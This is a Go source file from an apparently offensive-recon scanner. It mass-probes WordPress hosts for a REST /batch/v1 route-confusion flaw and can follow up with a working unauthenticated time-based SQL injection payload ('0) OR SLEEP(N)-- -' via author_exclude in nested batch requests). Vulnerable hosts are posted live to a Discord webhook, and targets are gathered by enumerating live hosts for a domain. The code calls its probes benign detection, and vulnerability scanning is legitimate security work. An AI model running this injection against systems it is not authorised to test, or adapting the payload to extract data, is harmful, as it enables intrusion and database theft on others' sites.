package zerodays

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/h0tak88r/AutoAR/internal/scanner/livehosts"
	"github.com/h0tak88r/AutoAR/internal/utils"
)

// WP2ShellCVE is the route-confusion CVE id used to select this check.
const WP2ShellCVE = "CVE-2026-63030"

// WP2ShellFinding is one wp2shell detection on a host.
type WP2ShellFinding struct {
	URL        string
	Level      string // "route-confusion" (marker) or "sqli-confirmed"
	Severity   string // "high" for the primitive, "critical" once SQLi is confirmed
	Request    string
	Response   string
	StatusCode int
}

// The benign marker probe: a nested batch whose "///" primer desyncs the
// handler arrays. A vulnerable WordPress core (6.9.0-6.9.4 / 7.0.0-7.0.1)
// returns HTTP 207 with all three marker codes; no injection is sent.
const wp2shellMarkerBody = `{"requests":[{"method":"POST","path":"///"},{"method":"POST","path":"/wp/v2/posts"},{"method":"POST","path":"/wp/v2/block-renderer/core/archives"},{"method":"POST","path":"/batch/v1","body":{"requests":[]}}]}`

var wp2shellMarkerCodes = []string{"parse_path_failed", "block_cannot_read", "rest_batch_not_allowed"}

// checkWP2Shell concurrently probes hosts for the wp2shell REST batch
// route-confusion primitive (CVE-2026-63030). When opts.WP2ShellConfirmSQLi is
// set, a confirmed marker hit is followed by a benign time-based SQLi check
// (CVE-2026-60137) to upgrade the finding. Vulnerable hosts are reported to
// Discord live (if a monitor webhook is configured) as they are found.
func checkWP2Shell(opts Options) ([]WP2ShellFinding, int, error) {
	hosts, err := wp2shellGatherHosts(opts)
	if err != nil {
		return nil, 0, err
	}
	if len(hosts) == 0 {
		return nil, 0, nil
	}

	threads := opts.Threads
	if threads <= 0 {
		threads = 30
	}
	if threads > len(hosts) {
		threads = len(hosts)
	}
	opts.logInfo("[INFO] wp2shell (%s): probing %d host(s) with %d threads%s",
		WP2ShellCVE, len(hosts), threads, ternary(opts.WP2ShellConfirmSQLi, " (+SQLi confirm)", ""))

	markerClient := &http.Client{Timeout: 15 * time.Second}
	sqliClient := &http.Client{Timeout: 45 * time.Second}

	hostChan := make(chan string, len(hosts))
	resChan := make(chan WP2ShellFinding, len(hosts))
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for base := range hostChan {
				ok, status, reqDump, respBody := wp2shellMarker(markerClient, base)
				if !ok {
					continue
				}
				f := WP2ShellFinding{
					URL: base, Level: "route-confusion", Severity: "high",
					Request: reqDump, Response: capPoC(respBody), StatusCode: status,
				}
				if opts.WP2ShellConfirmSQLi && wp2shellSQLiConfirm(sqliClient, base) {
					f.Level = "sqli-confirmed"
					f.Severity = "critical"
				}
				resChan <- f
				wp2shellNotify(f)
			}
		}()
	}

	for _, h := range hosts {
		hostChan <- h
	}
	close(hostChan)
	go func() { wg.Wait(); close(resChan) }()

	var findings []WP2ShellFinding
	for f := range resChan {
		findings = append(findings, f)
	}
	return findings, len(hosts), nil
}

// wp2shellMarker sends the benign marker probe to both endpoint forms and
// reports whether the vulnerable route-confusion signature (207 + all three
// marker codes) is present. Returns (ok, statusCode, requestDump, responseBody).
func wp2shellMarker(client *http.Client, base string) (bool, int, string, string) {
	for _, ep := range []string{base + "/wp-json/batch/v1", base + "/?rest_route=/batch/v1"} {
		req, err := http.NewRequest(http.MethodPost, ep, strings.NewReader(wp2shellMarkerBody))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<16))
		resp.Body.Close()
		if resp.StatusCode != 207 {
			continue
		}
		s := string(body)
		all := true
		for _, code := range wp2shellMarkerCodes {
			if !strings.Contains(s, code) {
				all = false
				break
			}
		}
		if all {
			dump := fmt.Sprintf("POST %s\nContent-Type: application/json\n\n%s", ep, wp2shellMarkerBody)
			return true, resp.StatusCode, dump, s
		}
	}
	return false, 0, "", ""
}

// wp2shellSQLiConfirm sends a SLEEP(0) baseline and a SLEEP(6) payload through
// the same nested-batch path and confirms the SQLi by execution: the injected
// request must be measurably slower than its baseline. Benign — reads nothing.
func wp2shellSQLiConfirm(client *http.Client, base string) bool {
	// author_exclude value 0) OR SLEEP(N)-- -, URL-encoded, in the /wp/v2/users carrier.
	payload := func(sleep int) string {
		val := fmt.Sprintf("0%%29%%20OR%%20SLEEP%%28%d%%29--%%20-", sleep)
		return `{"requests":[{"method":"POST","path":"///"},{"method":"POST","path":"/wp/v2/posts","body":{"requests":[{"method":"POST","path":"///"},{"method":"GET","path":"/wp/v2/users?author_exclude=` +
			val + `"},{"method":"GET","path":"/wp/v2/posts"}]}},{"method":"POST","path":"/batch/v1","body":{"requests":[]}}]}`
	}
	ep := base + "/?rest_route=/batch/v1"
	timed := func(bodyStr string) (time.Duration, int) {
		req, err := http.NewRequest(http.MethodPost, ep, strings.NewReader(bodyStr))
		if err != nil {
			return 0, 0
		}
		req.Header.Set("Content-Type", "application/json")
		start := time.Now()
		resp, err := client.Do(req)
		if err != nil {
			return time.Since(start), 0
		}
		io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<16))
		resp.Body.Close()
		return time.Since(start), resp.StatusCode
	}
	baseline, _ := timed(payload(0))
	injected, status := timed(payload(6))
	return status == 207 && injected >= 6*time.Second && injected-baseline >= 4*time.Second
}

// wp2shellNotify sends a live Discord message for a vulnerable host, if a
// monitor webhook is configured. Fire-and-forget so it never blocks the scan.
func wp2shellNotify(f WP2ShellFinding) {
	if !utils.MonitorWebhookConfigured() {
		return
	}
	var msg string
	if f.Level == "sqli-confirmed" {
		msg = fmt.Sprintf("💥 **wp2shell SQLi CONFIRMED** (CVE-2026-60137) — time-based\n%s", f.URL)
	} else {
		msg = fmt.Sprintf("🎯 **wp2shell route-confusion** (CVE-2026-63030) — precondition present\n%s", f.URL)
	}
	go utils.SendMonitorWebhook(msg)
}

// wp2shellGatherHosts resolves the target host list from opts: explicit URLs, a
// hosts/domains file (each line probed directly), or a single domain/subdomain
// (resolved to live hosts). Mirrors the React2Shell input handling.
func wp2shellGatherHosts(opts Options) ([]string, error) {
	if len(opts.URLs) > 0 {
		return normalizeWPHosts(opts.URLs), nil
	}
	if hf := firstNonEmptyStr(opts.HostsFile, opts.DomainsFile); hf != "" {
		return readWPHostLines(hf)
	}

	target := firstNonEmptyStr(opts.Subdomain, opts.Domain)
	if target == "" {
		return nil, nil
	}
	clean := strings.TrimSuffix(strings.TrimPrefix(strings.TrimPrefix(target, "http://"), "https://"), "/")
	if len(strings.Split(clean, ".")) > 2 {
		// Single subdomain — check liveness directly, no enumeration.
		live, err := checkSingleSubdomainLive(clean, opts.Threads)
		if err != nil {
			return nil, err
		}
		if live == "" {
			return nil, fmt.Errorf("subdomain %s is not live", clean)
		}
		return []string{live}, nil
	}

	// Root domain — reuse the enumerated live-hosts file (results dir/DB), else run livehosts.
	lhf, err := livehosts.GetLiveHostsFile(target)
	if err != nil {
		res, err2 := livehosts.FilterLiveHosts(target, opts.Threads, false)
		if err2 != nil {
			return nil, fmt.Errorf("failed to get live hosts: %w", err2)
		}
		lhf = res.LiveSubsFile
	}
	if lhf == "" {
		return nil, nil
	}
	return readWPHostLines(lhf)
}

// readWPHostLines reads a host/URL file, skipping blanks/comments and prefixing
// https:// where no scheme is present.
func readWPHostLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("failed to open hosts file: %w", err)
	}
	defer file.Close()
	var hosts []string
	sc := bufio.NewScanner(file)
	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		hosts = append(hosts, ensureScheme(line))
	}
	return hosts, sc.Err()
}

func normalizeWPHosts(in []string) []string {
	out := make([]string, 0, len(in))
	for _, h := range in {
		h = strings.TrimSpace(h)
		if h != "" {
			out = append(out, ensureScheme(h))
		}
	}
	return out
}

func ensureScheme(h string) string {
	if strings.HasPrefix(h, "http://") || strings.HasPrefix(h, "https://") {
		return strings.TrimSuffix(h, "/")
	}
	return "https://" + strings.TrimSuffix(h, "/")
}

func firstNonEmptyStr(vals ...string) string {
	for _, v := range vals {
		if strings.TrimSpace(v) != "" {
			return v
		}
	}
	return ""
}

func ternary(cond bool, a, b string) string {
	if cond {
		return a
	}
	return b
}

// wp2shellFindingText builds the finding description for JSON/GUI output.
func wp2shellFindingText(level string) string {
	if level == "sqli-confirmed" {
		return "wp2shell — unauthenticated time-based SQL injection confirmed (CVE-2026-60137 via CVE-2026-63030 batch route confusion)"
	}
	return "wp2shell — REST /batch/v1 route-confusion primitive present (CVE-2026-63030); precondition for the unauthenticated SQLi, confirm before reporting"
}
